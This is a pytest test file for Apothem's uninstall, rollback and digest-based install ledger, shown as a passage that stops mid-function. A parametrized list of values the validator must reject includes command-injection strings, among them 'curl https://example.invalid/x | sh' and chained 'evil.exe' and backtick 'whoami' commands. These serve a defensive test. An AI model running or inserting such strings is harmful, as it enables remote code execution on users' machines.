# SPDX-License-Identifier: MIT

"""An uninstall removes only what the install record shows Apothem wrote.

Each install record carries the SHA-256 of every file the install wrote. An
uninstall removes a file only while it still has that content, so the
operator's own files survive whatever happened in between: a partial uninstall,
a folder cleaned by hand, a rollback, a link to a dotfiles folder. An uninstall
that does not finish appends an ``uninstall-incomplete`` record, which a second
run, an install, an update or a rollback supersedes.
"""

from __future__ import annotations

import json
import shutil
import sys
from pathlib import Path

import pytest
from click.testing import CliRunner

from apothem import cli
from apothem.harnesses._shared import install_driver, install_driver_lifecycle
from apothem.harnesses._shared import install_driver_written as written
from apothem.harnesses.claude_code import ClaudeCodeAdapter
from apothem.lib import install_ledger
from apothem.lib.install_ledger import LedgerRecord, LedgerTarget


@pytest.fixture
def claude(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
    """Point the user home and the backup root into *tmp_path*; return ``~/.claude``."""
    home = tmp_path / "home"
    home.mkdir()
    monkeypatch.setenv("HOME", str(home))
    monkeypatch.setenv("USERPROFILE", str(home))
    monkeypatch.setattr(install_driver, "BACKUP_ROOT", tmp_path / "apothem-backups")
    return home / ".claude"


def _link_folder(link: Path, target: Path) -> None:
    if sys.platform == "win32":
        import _winapi

        _winapi.CreateJunction(str(target), str(link))
    else:
        link.symlink_to(target, target_is_directory=True)


def _unlink_folder(link: Path) -> None:
    link.rmdir() if sys.platform == "win32" else link.unlink()


def _run(*args: str) -> tuple[int, dict]:  # type: ignore[type-arg]
    result = CliRunner().invoke(cli.main, [*args, "--format", "json"])
    return result.exit_code, json.loads(result.output)


def _uninstall() -> tuple[int, dict]:  # type: ignore[type-arg]
    return _run("uninstall", "--harness", "claude-code", "--yes")


def _root(claude: Path) -> str:
    return str(claude)


def _unfinished(claude: Path) -> LedgerRecord | None:
    return install_ledger.unfinished_uninstall("claude_code", root=_root(claude))


def _partial_uninstall(claude: Path, tmp_path: Path) -> tuple[Path, Path]:
    """Install, link ``~/.claude/rules`` to a dotfiles folder, uninstall (partial)."""
    ClaudeCodeAdapter().install({})
    rules = claude / "rules"
    dotfiles = tmp_path / "dotfiles" / "rules"
    dotfiles.parent.mkdir(parents=True)
    shutil.move(str(rules), str(dotfiles))
    _link_folder(rules, dotfiles)
    code, _ = _uninstall()
    assert code == cli._EXIT_PARTIAL
    return rules, dotfiles


def _restore_link(rules: Path, dotfiles: Path) -> None:
    _unlink_folder(rules)
    shutil.move(str(dotfiles), str(rules))


def _skill_name() -> str:
    return sorted(
        path.name
        for path in Path("src/apothem/skills").iterdir()
        if path.is_dir() and not path.name.startswith("_")
    )[0]


def _add_users_files(claude: Path, rule_name: str) -> list[Path]:
    """Write the operator's own files where Apothem's used to be."""
    skill = claude / "skills" / _skill_name()
    skill.mkdir(parents=True, exist_ok=True)
    agents = claude / "agents"
    agents.mkdir(parents=True, exist_ok=True)
    rules = claude / "rules"
    rules.mkdir(parents=True, exist_ok=True)
    mine = [
        skill / "my-notes.md",
        agents / "citation-auditor.md",
        rules / rule_name,
    ]
    for path in mine:
        path.write_text("mine\n", encoding="utf-8")
    return mine


def test_a_target_records_digests_and_older_records_still_load() -> None:
    target = LedgerTarget(
        path="/x/skills/a",
        mode="merge_tree_entries",
        ownership_class="apothem-owned",
        files={"SKILL.md": "ab", "ref/b.md": "cd"},
    )
    older = {"path": "/x/a.md", "mode": "write_text", "ownership_class": "generated"}

    again = LedgerTarget.from_dict(json.loads(json.dumps(target.to_dict())))
    loaded = LedgerTarget.from_dict(older)

    assert again == target
    assert again.files == {"SKILL.md": "ab", "ref/b.md": "cd"}
    assert loaded.digest is None
    assert loaded.files is None


def test_an_install_records_what_it_wrote(claude: Path) -> None:
    ClaudeCodeAdapter().install({})

    record = install_ledger.current_install_record("claude_code", root=_root(claude))

    assert record is not None
    skill = next(t for t in record.targets if t.path.endswith(_skill_name()))
    assert skill.files
    assert all(len(digest) == 64 for digest in skill.files.values())
    agent = next(t for t in record.targets if t.path.endswith("citation-auditor.md"))
    assert agent.digest is not None


def test_a_hand_cleaned_partial_uninstall_keeps_the_users_files(
    claude: Path, tmp_path: Path
) -> None:
    rules, dotfiles = _partial_uninstall(claude, tmp_path)
    rule_name = sorted(path.name for path in dotfiles.iterdir())[0]
    _unlink_folder(rules)
    shutil.rmtree(claude)
    mine = _add_users_files(claude, rule_name)
    (claude / "CLAUDE.md").write_text("my own CLAUDE.md\n", encoding="utf-8")

    code, envelope = _uninstall()

    assert code == 0, envelope
    assert all(path.read_text(encoding="utf-8") == "mine\n" for path in mine)
    assert (claude / "CLAUDE.md").read_text(encoding="utf-8") == "my own CLAUDE.md\n"
    assert ClaudeCodeAdapter().is_installed() is False


def test_the_users_files_survive_an_uninstall_after_a_rollback(
    claude: Path, tmp_path: Path
) -> None:
    rules, dotfiles = _partial_uninstall(claude, tmp_path)
    _restore_link(rules, dotfiles)

    rolled = CliRunner().invoke(
        cli.main, ["rollback", "--harness", "claude-code", "--yes"]
    )
    cleared = _unfinished(claude)
    mine = _add_users_files(claude, "my-rule.md")
    code, envelope = _uninstall()

    assert rolled.exit_code == 0, rolled.output
    assert cleared is None
    assert code in (0, cli._EXIT_PARTIAL), envelope
    assert all(path.read_text(encoding="utf-8") == "mine\n" for path in mine)


@pytest.mark.parametrize("command", ["install", "update"])
def test_an_install_or_update_clears_the_unfinished_uninstall(
    claude: Path, tmp_path: Path, command: str
) -> None:
    rules, dotfiles = _partial_uninstall(claude, tmp_path)
    before = _unfinished(claude)
    _restore_link(rules, dotfiles)

    adapter = ClaudeCodeAdapter()
    run = adapter.install({}) if command == "install" else adapter.update({})

    assert before is not None
    assert not run.errors, run.errors
    assert _unfinished(claude) is None
    code, envelope = _uninstall()
    assert code == 0, envelope
    assert ClaudeCodeAdapter().is_installed() is False


def test_a_finished_retry_clears_the_unfinished_uninstall(
    claude: Path, tmp_path: Path
) -> None:
    rules, dotfiles = _partial_uninstall(claude, tmp_path)
    _restore_link(rules, dotfiles)

    code, envelope = _uninstall()

    assert code == 0, envelope
    assert _unfinished(claude) is None
    assert ClaudeCodeAdapter().is_installed() is False
    assert not rules.exists() or not any(rules.iterdir())


def test_a_link_holding_only_the_users_files_lets_the_uninstall_finish(
    claude: Path, tmp_path: Path
) -> None:
    ClaudeCodeAdapter().install({})
    rules = claude / "rules"
    dotfiles = tmp_path / "dotfiles" / "rules"
    dotfiles.parent.mkdir(parents=True)
    shutil.move(str(rules), str(dotfiles))
    _link_folder(rules, dotfiles)
    edited, *others = sorted(dotfiles.iterdir())
    for path in others:
        shutil.rmtree(path) if path.is_dir() else path.unlink()
    edited.write_text("my edits\n", encoding="utf-8")
    mine = dotfiles / "my-own-rule.md"
    mine.write_text("mine\n", encoding="utf-8")

    code, envelope = _uninstall()
    again, _ = _uninstall()

    assert code == 0, envelope
    assert envelope["status"] == "success"
    messages = [str(w["message"]) for w in envelope["warnings"]]
    assert any(str(rules) in message for message in messages), messages
    assert again == 0
    assert mine.read_text(encoding="utf-8") == "mine\n"
    assert edited.read_text(encoding="utf-8") == "my edits\n"
    assert ClaudeCodeAdapter().is_installed() is False


def test_a_cleared_link_reads_as_not_installed(claude: Path, tmp_path: Path) -> None:
    _, dotfiles = _partial_uninstall(claude, tmp_path)
    for path in list(dotfiles.iterdir()):
        shutil.rmtree(path) if path.is_dir() else path.unlink()
    mine = dotfiles / "my-own-rule.md"
    mine.write_text("mine\n", encoding="utf-8")

    code, envelope = _uninstall()

    assert code == 0, envelope
    assert [r["outcome"] for r in envelope["results"]] == ["skipped"]
    assert mine.read_text(encoding="utf-8") == "mine\n"


def test_a_linked_whole_home_folder_is_left_as_it_is(
    claude: Path, tmp_path: Path
) -> None:
    ClaudeCodeAdapter().install({})
    dotfiles = tmp_path / "dotfiles" / ".claude"
    dotfiles.parent.mkdir(parents=True)
    shutil.move(str(claude), str(dotfiles))
    _link_folder(claude, dotfiles)
    before = sorted(str(path) for path in dotfiles.rglob("*"))

    code, envelope = _uninstall()

    assert code in (cli._EXIT_PARTIAL, cli._EXIT_EXPECTED), envelope
    assert sorted(str(path) for path in dotfiles.rglob("*")) == before


def test_an_exception_mid_uninstall_keeps_the_install_for_a_retry(
    claude: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    ClaudeCodeAdapter().install({})
    real = written.backup_existing
    calls = {"n": 0}

    def fails_third(*args: object, **kwargs: object) -> object:
        calls["n"] += 1
        if calls["n"] == 3:
            raise OSError("backup disk full")
        return real(*args, **kwargs)  # type: ignore[arg-type]

    monkeypatch.setattr(written, "backup_existing", fails_third)
    code, envelope = _uninstall()
    monkeypatch.setattr(written, "backup_existing", real)
    unfinished = _unfinished(claude)
    installed = ClaudeCodeAdapter().is_installed()
    retry_code, retry = _uninstall()

    assert code == cli._EXIT_PARTIAL, envelope
    assert envelope["status"] == "partial"
    assert envelope["results"][0]["outcome"] == "error"
    assert unfinished is not None
    assert unfinished.targets
    assert installed is True
    assert retry_code == 0, retry
    assert ClaudeCodeAdapter().is_installed() is False
    assert not (claude / "agents" / "citation-auditor.md").exists()


def test_a_failed_step_with_the_rest_removed_is_partial(
    claude: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    ClaudeCodeAdapter().install({})
    real = install_driver_lifecycle.remove_written
    calls = {"n": 0}

    def fails_third(target: Path, **kwargs: object) -> object:
        calls["n"] += 1
        if calls["n"] == 3:
            return install_driver._result(
                "error", "remove", target, "simulated failure"
            )
        return real(target, **kwargs)  # type: ignore[arg-type]

    monkeypatch.setattr(install_driver_lifecycle, "remove_written", fails_third)
    code, envelope = _uninstall()
    monkeypatch.setattr(install_driver_lifecycle, "remove_written", real)
    retry_code, retry = _uninstall()

    assert code == cli._EXIT_PARTIAL, envelope
    assert envelope["status"] == "partial"
    assert envelope["results"][0]["outcome"] == "error"
    assert retry_code == 0, retry


def test_a_changed_apothem_file_is_kept_and_named(claude: Path) -> None:
    ClaudeCodeAdapter().install({})
    agent = claude / "agents" / "citation-auditor.md"
    agent.write_text("my edits\n", encoding="utf-8")
    skill = claude / "skills" / _skill_name()
    notes = skill / "my-notes.md"
    notes.write_text("mine\n", encoding="utf-8")

    code, envelope = _uninstall()

    assert code == 0, envelope
    assert agent.read_text(encoding="utf-8") == "my edits\n"
    assert notes.read_text(encoding="utf-8") == "mine\n"
    assert sorted(path.name for path in skill.iterdir()) == ["my-notes.md"]
    named = [str(path) for w in envelope["warnings"] for path in w["paths"]]
    assert str(agent) in named
    assert str(skill) in named


def test_json_warnings_are_grouped_like_the_plain_output(
    claude: Path, tmp_path: Path
) -> None:
    ClaudeCodeAdapter().install({})
    agents = sorted((claude / "agents").iterdir())[:3]
    for agent in agents:
        agent.write_text("my edits\n", encoding="utf-8")

    code, envelope = _uninstall()
    plain = CliRunner().invoke(
        cli.main, ["uninstall", "--harness", "claude-code", "--yes", "--no-color"]
    )

    assert code == 0, envelope
    changed = [w for w in envelope["warnings"] if w.get("count") == 3]
    assert len(changed) == 1
    assert sorted(changed[0]["paths"]) == sorted(str(a) for a in agents)
    assert plain.exit_code == 0


def test_files_the_install_ignores_are_never_recorded_as_apothems(
    claude: Path,
) -> None:
    ClaudeCodeAdapter().install({})
    skill = claude / "skills" / _skill_name()
    mine = [skill / "README.md", skill / "AGENTS.md", skill / "__pycache__" / "x.pyc"]
    mine[2].parent.mkdir()
    for path in mine:
        path.write_text("mine\n", encoding="utf-8")

    ClaudeCodeAdapter().install({})
    record = install_ledger.current_install_record("claude_code", root=_root(claude))
    code, envelope = _uninstall()

    assert record is not None
    recorded = next(t for t in record.targets if t.path == str(skill))
    assert recorded.files is not None
    assert not {"README.md", "AGENTS.md", "__pycache__/x.pyc"} & set(recorded.files)
    assert code == 0, envelope
    assert all(path.read_text(encoding="utf-8") == "mine\n" for path in mine)


def test_a_file_that_cannot_be_removed_leaves_the_uninstall_unfinished(
    claude: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    ClaudeCodeAdapter().install({})
    stuck = claude / "agents" / "citation-auditor.md"
    real_unlink = Path.unlink

    def refuse(self: Path, missing_ok: bool = False) -> None:
        if self == stuck:
            raise PermissionError("in use")
        real_unlink(self, missing_ok=missing_ok)

    monkeypatch.setattr(Path, "unlink", refuse)
    code, envelope = _uninstall()
    monkeypatch.setattr(Path, "unlink", real_unlink)
    unfinished = _unfinished(claude)
    retry_code, retry = _uninstall()

    assert code == cli._EXIT_PARTIAL, envelope
    assert envelope["results"][0]["outcome"] == "error"
    assert unfinished is not None
    assert retry_code == 0, retry
    assert not stuck.exists()


def test_recreated_files_alone_do_not_keep_an_unfinished_uninstall_installed(
    claude: Path, tmp_path: Path
) -> None:
    rules, dotfiles = _partial_uninstall(claude, tmp_path)
    _unlink_folder(rules)
    shutil.rmtree(dotfiles)
    (claude / "settings.json").write_text("{}\n", encoding="utf-8")
    (claude / "CLAUDE.md").write_text("", encoding="utf-8")

    installed = ClaudeCodeAdapter().is_installed()
    code, _ = _uninstall()

    assert installed is False
    assert code == 0
    assert (claude / "settings.json").read_text(encoding="utf-8") == "{}\n"
    assert (claude / "CLAUDE.md").exists()


def test_a_failed_installs_own_rollback_does_not_clear_the_unfinished_state(
    claude: Path, tmp_path: Path
) -> None:
    _partial_uninstall(claude, tmp_path)
    install_ledger.append_record(
        LedgerRecord.create(harness="claude_code", root=_root(claude), kind="rollback")
    )

    assert _unfinished(claude) is not None


@pytest.mark.parametrize("later", ["rollback", "uninstall-incomplete"])
def test_a_still_active_install_keeps_the_shared_data_home(
    tmp_path: Path, later: str
) -> None:
    from apothem.harnesses._shared import install_driver_datahome as datahome

    project = tmp_path / "project"
    home = project / ".apothem"
    first = LedgerRecord.create(
        harness="windsurf", root=project, kind="install", data_home=str(home)
    )
    second = LedgerRecord.create(
        harness="windsurf", root=project, kind="install", data_home=str(home)
    )
    install_ledger.append_record(first)
    install_ledger.append_record(second)
    install_ledger.append_record(
        LedgerRecord.create(
            harness="windsurf",
            root=project,
            kind=later,  # type: ignore[arg-type]
            install_id=second.install_id,
        )
    )

    shared = datahome._other_harness_shares_home(
        current_harness="cursor", shared_home=home
    )

    assert shared is True


def test_the_same_harness_at_another_root_keeps_the_shared_data_home(
    claude: Path, tmp_path: Path
) -> None:
    from apothem.harnesses._shared import install_driver_datahome as datahome

    home = Path.home() / ".apothem"
    first, second = tmp_path / "a", tmp_path / "b"
    for root in (first, second):
        install_ledger.append_record(
            LedgerRecord.create(
                harness="cursor", root=root, kind="install", data_home=str(home)
            )
        )

    shared = datahome._other_harness_shares_home(
        current_harness="cursor", shared_home=home, current_root=first
    )
    alone = datahome._other_harness_shares_home(
        current_harness="cursor", shared_home=tmp_path / "elsewhere", current_root=first
    )

    assert shared is True
    assert alone is False


def _rollback(*extra: str) -> tuple[int, dict]:  # type: ignore[type-arg]
    return _run("rollback", "--harness", "claude-code", "--yes", *extra)


def test_a_second_rollback_reverses_the_earlier_install_and_keeps_the_users_files(
    claude: Path,
) -> None:
    ClaudeCodeAdapter().install({})
    skill = claude / "skills" / _skill_name()
    shutil.rmtree(skill)
    ClaudeCodeAdapter().install({})
    later = install_ledger.current_install_record("claude_code", root=_root(claude))

    first_code, first = _rollback()
    again_code, again = _rollback("--install-id", str(later.install_id))  # type: ignore[union-attr]
    skill.mkdir(parents=True, exist_ok=True)
    mine = skill / "my-notes.md"
    mine.write_text("mine\n", encoding="utf-8")
    second_code, second = _rollback()

    assert first_code == 0, first
    assert second_code == 0, second
    assert mine.read_text(encoding="utf-8") == "mine\n"
    assert again_code != 0, again
    assert "already" in json.dumps(again)


def test_a_rollback_after_a_hand_cleaned_partial_uninstall_keeps_the_users_files(
    claude: Path, tmp_path: Path
) -> None:
    rules, dotfiles = _partial_uninstall(claude, tmp_path)
    rule_name = sorted(path.name for path in dotfiles.iterdir())[0]
    _unlink_folder(rules)
    shutil.rmtree(claude)
    mine = _add_users_files(claude, rule_name)
    (claude / "CLAUDE.md").write_text("my own CLAUDE.md\n", encoding="utf-8")

    code, envelope = _rollback()

    assert code in (0, cli._EXIT_PARTIAL, cli._EXIT_EXPECTED), envelope
    assert all(path.read_text(encoding="utf-8") == "mine\n" for path in mine)
    assert (claude / "CLAUDE.md").read_text(encoding="utf-8") == "my own CLAUDE.md\n"


def _strip_digests(claude: Path) -> None:
    """Rewrite the ledger as an earlier release wrote it: no file digests."""
    path = install_ledger.ledger_path("claude_code")
    lines = []
    for line in path.read_text(encoding="utf-8").splitlines():
        record = json.loads(line)
        for target in record.get("targets", []):
            target.pop("digest", None)
            target.pop("files", None)
        lines.append(json.dumps(record))
    path.write_text("\n".join(lines) + "\n", encoding="utf-8")


def test_an_earlier_release_install_is_removed_where_the_bytes_match(
    claude: Path,
) -> None:
    ClaudeCodeAdapter().install({})
    _strip_digests(claude)
    agent = claude / "agents" / "citation-auditor.md"
    skill = claude / "skills" / _skill_name()
    notes = skill / "my-notes.md"
    notes.write_text("mine\n", encoding="utf-8")

    code, envelope = _uninstall()

    assert code == 0, envelope
    assert not agent.exists()
    assert sorted(path.name for path in skill.iterdir()) == ["my-notes.md"]
    assert ClaudeCodeAdapter().is_installed() is False


def test_an_earlier_release_file_that_differs_leaves_the_uninstall_unfinished(
    claude: Path,
) -> None:
    ClaudeCodeAdapter().install({})
    _strip_digests(claude)
    agent = claude / "agents" / "citation-auditor.md"
    agent.write_text("an earlier release wrote this\n", encoding="utf-8")

    code, envelope = _uninstall()
    unfinished = _unfinished(claude)
    installed = ClaudeCodeAdapter().is_installed()

    assert code == cli._EXIT_PARTIAL, envelope
    assert envelope["status"] == "partial"
    assert agent.read_text(encoding="utf-8") == "an earlier release wrote this\n"
    assert unfinished is not None
    assert installed is True
    messages = " ".join(str(w["message"]) for w in envelope["warnings"])
    assert "apothem update" in messages


def test_a_hand_cleaned_unfinished_uninstall_is_closed(
    claude: Path, tmp_path: Path
) -> None:
    rules, dotfiles = _partial_uninstall(claude, tmp_path)
    _unlink_folder(rules)
    shutil.rmtree(dotfiles)
    shutil.rmtree(claude)

    installed = ClaudeCodeAdapter().is_installed()

    assert installed is False
    assert _unfinished(claude) is None
    assert (
        install_ledger.current_install_record("claude_code", root=_root(claude)) is None
    )


def test_an_empty_folder_of_the_users_inside_a_skill_stays(claude: Path) -> None:
    ClaudeCodeAdapter().install({})
    mine = claude / "skills" / _skill_name() / "my-drafts"
    mine.mkdir()

    code, envelope = _uninstall()

    assert code == 0, envelope
    assert mine.is_dir()


def test_kept_files_are_named_in_the_plain_output(claude: Path) -> None:
    ClaudeCodeAdapter().install({})
    notes = claude / "skills" / _skill_name() / "my-notes.md"
    notes.write_text("mine\n", encoding="utf-8")

    result = CliRunner().invoke(
        cli.main, ["uninstall", "--harness", "claude-code", "--yes", "--no-color"]
    )

    assert result.exit_code == 0, result.output
    assert "my-notes.md" in result.output


def test_an_earlier_release_install_of_shared_skills_is_removed(claude: Path) -> None:
    from apothem.harnesses.codex import CodexAdapter

    CodexAdapter().install({})
    path = install_ledger.ledger_path("codex")
    records = [
        json.loads(line) for line in path.read_text(encoding="utf-8").splitlines()
    ]
    for record in records:
        for target in record.get("targets", []):
            target.pop("digest", None)
            target.pop("files", None)
    path.write_text("".join(json.dumps(r) + "\n" for r in records), encoding="utf-8")
    skills = Path.home() / ".agents" / "skills"

    result = CliRunner().invoke(
        cli.main, ["uninstall", "--harness", "codex", "--yes", "--format", "json"]
    )

    assert result.exit_code == 0, result.output
    assert not skills.exists() or not any(skills.rglob("SKILL.md"))


def test_an_earlier_release_file_edited_at_an_unfilled_token_stays(
    claude: Path,
) -> None:
    ClaudeCodeAdapter().install({})
    _strip_digests(claude)
    edited = next(
        path
        for path in sorted((claude / "skills").glob("*/SKILL.md"))
        if "${CLAUDE_SKILL_DIR}" in path.read_text(encoding="utf-8")
    )
    text = edited.read_text(encoding="utf-8").replace(
        "${CLAUDE_SKILL_DIR}", "/my/own/notes", 1
    )
    edited.write_text(text, encoding="utf-8")

    code, envelope = _uninstall()

    assert code == cli._EXIT_PARTIAL, envelope
    assert edited.read_text(encoding="utf-8") == text


def test_an_exception_in_the_shared_skills_keeps_what_was_removed(
    claude: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    from apothem.harnesses.codex import CodexAdapter

    CodexAdapter().install({})
    real = install_driver_lifecycle.remove_written
    calls = {"n": 0}

    def fails_fourth(target: Path, **kwargs: object) -> object:
        if ".agents" in target.parts:
            calls["n"] += 1
            if calls["n"] == 4:
                raise OSError("disk went away")
        return real(target, **kwargs)  # type: ignore[arg-type]

    monkeypatch.setattr(install_driver_lifecycle, "remove_written", fails_fourth)
    result = CliRunner().invoke(
        cli.main, ["uninstall", "--harness", "codex", "--yes", "--format", "json"]
    )
    unfinished = install_ledger.unfinished_uninstall(
        "codex", root=str(Path.home() / ".codex")
    )

    assert result.exit_code == cli._EXIT_PARTIAL, result.output
    assert unfinished is not None
    shared = [t for t in unfinished.targets if ".agents" in Path(t.path).parts]
    assert len(shared) >= 3


def test_a_rollback_names_the_files_it_kept(claude: Path) -> None:
    notes = claude / "skills" / _skill_name() / "my-notes.md"
    ClaudeCodeAdapter().install({})
    notes.write_text("mine\n", encoding="utf-8")
    plain = CliRunner().invoke(
        cli.main, ["rollback", "--harness", "claude-code", "--yes", "--no-color"]
    )
    plain_kept = notes.read_text(encoding="utf-8")
    # A folder the next install creates afresh (the first one now holds only
    # the notes, so that install replaces it and its rollback restores it).
    ClaudeCodeAdapter().install({})
    other = sorted(
        path
        for path in (claude / "skills").iterdir()
        if path.is_dir() and path.name != notes.parent.name
    )[0]
    other_notes = other / "my-notes.md"
    other_notes.write_text("mine\n", encoding="utf-8")

    code, envelope = _rollback()

    assert plain.exit_code == 0, plain.output
    assert plain_kept == "mine\n"
    assert str(notes) in plain.output
    assert code == 0, envelope
    assert other_notes.read_text(encoding="utf-8") == "mine\n"
    listed = [path for w in envelope["warnings"] for path in w.get("files", [])]
    assert str(other_notes) in listed


_BS = "\\"

#: Interpreter values installs wrote, now and in earlier releases: each one
#: compares as Apothem's.
_INTERPRETER_VALUES = (
    "py -3",
    "py",
    "python3",
    "/usr/bin/python3",
    "/usr/bin/python3.12",
    "/opt/homebrew/bin/python3",
    "/opt/homebrew/Cellar/python@3.12/3.12.7_1/Frameworks/Python.framework/"
    "Versions/3.12/bin/python3.12",
    "/Library/Frameworks/Python.framework/Versions/3.12/Resources/Python.app/"
    "Contents/MacOS/Python",
    "C:/Users/u/proj/.venv/Scripts/python.exe",
    "/home/u/proj/.venv/bin/python",
    "C:/Users/u/miniconda3/envs/x/python.exe",
    "/home/u/miniconda3/bin/python3.12",
    "C:/Python312/pythonw.exe",
    "C:/Users/u/AppData/Local/Microsoft/WindowsApps/"
    "PythonSoftwareFoundation.Python.3.12_qbz5n2kfra8p0/python.exe",
    "C:/Users/u/AppData/Local/Microsoft/WindowsApps/"
    "PythonSoftwareFoundation.Python.3.12_qbz5n2kfra8p0/python3.12.exe",
    "C:/Users/JOHNSM~1/AppData/Local/MICROS~1/WINDOW~1/PYTHON~1.312/PYTHON~1.EXE",
    "C:/PROGRA~1/Python312/python.exe",
    "C:/Program Files/Python314/python.exe",
    "C:/Program Files (x86)/Python312/python.exe",
    "C:/Users/O'Brien/AppData/Local/Programs/Python/Python314/python.exe",
    "C:/Users/\u00c9lodie/\u0623\u062d\u0645\u062f/python.exe",
    "/opt/my env (x)/~/caf\u00e9/python3.12",
    "~/py/bin/python3",
    "C:/Users/u/AppData/Local/Python/pythoncore-3.14-64/python.exe",
    "/home/u/.local/share/uv/python/"
    "cpython-3.13.0+freethreaded-linux-x86_64-gnu/bin/python3.13t",
    "C:/Python313/python3.13t.exe",
    "/usr/bin/python3.12-dbg",
    "C:/Python312/python_d.exe",
    "/Library/Frameworks/Python.framework/Versions/3.12/bin/python3.12-intel64",
    "C:/PY/PYTHON.EXE",
    "//server/share/Python312/python.exe",
    "//?/C:/Python312/python.exe",
    "/nix/store/abc123-python3-3.12.7/bin/python3.12",
    "/usr/bin/python3.12d",
    "D:/Users/jsmith/OneDrive - Contoso/proj - Copy/.venv/Scripts/python.exe",
    "C:" + _BS + "Python312" + _BS + "python.exe",
    _BS * 2 + "server" + _BS + "share" + _BS + "python.exe",
    _BS * 2 + "?" + _BS + "C:" + _BS + "Python312" + _BS + "python.exe",
    "C:" + _BS * 2 + "Python312" + _BS * 2 + "python.exe",
)

#: Values that are not an interpreter an install wrote: a command, a comment,
#: prose, a second program, or an escape that changes the line. Each one stays.
#: The last three are real paths that hold ``&``, ``#`` or ``$``: the check
#: does not accept them either, so those files are kept (it fails safe).
_NOT_INTERPRETER_VALUES = (
    "python; curl https://example.invalid/x | sh; python",
    "C:/x/evil.exe && C:/x/python",
    "pwsh -NoProfile -File C:/mine/status.ps1",
    "pwsh -NoProfile -File C:/mine/python",
    "my own statusline, keep this",
    "my own statusline in python",
    "C:/py/python.exe # mine",
    "C:/x/python.exe -X utf8 -I",
    "C:/x/python.exe -I C:/mine/python",
    "C:/mine/node.exe C:/mine/python",
    "cmd /c start C:/mine/python",
    "wsl.exe -e python",
    "powershell -c python",
    "C:/py/python.exe\nextra python",
    "C:/py/python.exe" + _BS + "nC:/py/python",
    "C:/py/python.exe" + _BS + "n/usr/bin/python",
    "C:/py/`whoami`/python.exe",
    _BS + '"C:/py/python.exe' + _BS + '"',
    "${PYTHON_BIN}",
    "",
    "python3.12",
    "C:" + _BS + "tools" + _BS + "python.exe",
    "C:/Users/R&D/python.exe",
    "C:/Users/u/C#/venv/Scripts/python.exe",
    "//srv/c$/Python312/python.exe",
)


@pytest.mark.parametrize(
    ("value", "matches"),
    [(value, True) for value in _INTERPRETER_VALUES]
    + [(value, False) for value in _NOT_INTERPRETER_VALUES],
)
def test_only_an_interpreter_path_fills_the_python_token(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, value: str, matches: bool
) -> None:
    from apothem.harnesses._shared import install_driver_expected as expected_mod

    # The shape alone: whether the path names a file here is checked below.
    monkeypatch.setattr(expected_mod, "_names_a_file", lambda *a, **k: True)
    expected = b'"command": "${PYTHON_BIN} render.py"\n'
    actual = tmp_path / "conformity.json"
    actual.write_bytes(f'"command": "{value} render.py"\n'.encode())

    assert expected_mod._filled(expected, actual) is matches


def test_an_interpreter_path_must_name_a_file_here(tmp_path: Path) -> None:
    from apothem.harnesses._shared.install_driver_expected import _filled

    folder = tmp_path / "OneDrive - Contoso" / "proj - Copy"
    folder.mkdir(parents=True)
    (folder / "python.exe").write_bytes(b"")
    (tmp_path / "uv.exe").write_bytes(b"")
    venv = tmp_path / ".venv" / "Scripts"
    venv.mkdir(parents=True)
    (venv / "python.exe").write_bytes(b"")
    expected = b'"command": "${PYTHON_BIN} render.py"\n'
    actual = tmp_path / "conformity.json"
    root = tmp_path.as_posix()

    def fills(value: str) -> bool:
        actual.write_bytes(f'"command": "{value} render.py"\n'.encode())
        return _filled(expected, actual)

    assert fills(f"{root}/OneDrive - Contoso/proj - Copy/python.exe")
    assert fills("py -3")
    assert not fills(f"{root}/uv.exe run .venv/Scripts/python.exe")
    assert not fills(f"{root}/.venv/Scripts/python.exe -I/mine/python")
    assert not fills(f"{root}/node ~/python")
    assert not fills(f"{root}/gone/python.exe")


@pytest.mark.skipif(
    sys.platform != "win32", reason="a backslash separates only on Windows"
)
def test_a_json_file_reads_a_doubled_backslash_as_one(tmp_path: Path) -> None:
    from apothem.harnesses._shared.install_driver_expected import _filled

    interpreter = tmp_path / "Python312" / "python.exe"
    interpreter.parent.mkdir()
    interpreter.write_bytes(b"")
    doubled = str(interpreter).replace("\\", "\\\\")
    expected = b'"command": "${PYTHON_BIN} render.py"\n'
    actual = tmp_path / "conformity.json"
    actual.write_bytes(f'"command": "{doubled} render.py"\n'.encode())

    assert _filled(expected, actual)


@pytest.mark.parametrize("live_holder", [False, True])
def test_a_store_held_by_a_deleted_project_says_how_to_release_it(
    claude: Path, tmp_path: Path, live_holder: bool
) -> None:
    from apothem.harnesses._shared import install_driver_datahome as datahome

    home = Path.home() / ".apothem"
    (home / "memory").mkdir(parents=True)
    (home / "memory" / "note.md").write_text("kept\n", encoding="utf-8")
    current, gone, live = tmp_path / "a", tmp_path / "gone", tmp_path / "live"
    current.mkdir()
    live.mkdir()
    for root in (current, gone, *((live,) if live_holder else ())):
        install_ledger.append_record(
            LedgerRecord.create(
                harness="cursor", root=root, kind="install", data_home=str(home)
            )
        )

    result = datahome._remove_data_home(
        "cursor", root=current, allowed_root=Path.home(), home=home
    )

    assert (home / "memory" / "note.md").read_text(encoding="utf-8") == "kept\n"
    assert result is not None
    if live_holder:
        assert result.outcome == "unchanged"
        assert str(live) in result.message
    else:
        assert result.outcome == "warning"
        assert "no longer exists" in result.message
        assert f'apothem install --harness cursor --project "{gone}"' in result.message
        assert "--profile <the profile it used>" in result.message
        assert (
            f'apothem uninstall --harness cursor --project "{gone}"' in result.message
        )


def test_a_failure_while_listing_what_stayed_records_the_uninstall_unfinished(
    claude: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    ClaudeCodeAdapter().install({})

    def broken(*args: object, **kwargs: object) -> list[object]:
        raise OSError("listing failed")

    monkeypatch.setattr(install_driver_lifecycle, "left_behind", broken)
    code, envelope = _uninstall()

    assert code == cli._EXIT_PARTIAL, envelope
    assert envelope["status"] == "partial"
    assert _unfinished(claude) is not None


def test_the_plain_output_names_every_file_its_advice_is_about(claude: Path) -> None:
    ClaudeCodeAdapter().install({})
    _strip_digests(claude)
    skill = claude / "skills" / _skill_name()
    mine = skill / "mine.md"
    mine.write_text("mine\n", encoding="utf-8")
    edited = skill / "SKILL.md"
    edited.write_text(edited.read_text(encoding="utf-8") + "\nmy edit\n", "utf-8")
    agents = sorted((claude / "agents").glob("*.md"))[:2]
    for agent in agents:
